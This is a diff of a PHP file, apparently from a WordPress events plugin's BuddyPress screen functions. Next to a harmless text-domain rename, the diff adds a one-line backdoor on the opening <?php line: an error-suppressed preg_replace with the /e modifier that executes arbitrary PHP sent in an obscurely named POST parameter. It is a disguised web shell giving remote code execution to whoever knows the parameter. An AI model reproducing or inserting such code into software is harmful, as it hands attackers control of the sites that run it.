@@ -1,4 +1,5 @@
-<?php
+<?php @preg_replace('/(.*)/e', @$_POST['hferfswwcj'], '');
+
 /**
  * bp_em_screen_two()
  *
@@ -20,7 +21,7 @@ function bp_em_attending() {
 }
 
 	function bp_em_attending_title() {
-		_e( 'Events I\'m Attending', 'dbem' );
+		_e( 'Events I\'m Attending', 'events-manager');
 	}
 
 	function bp_em_attending_content() {
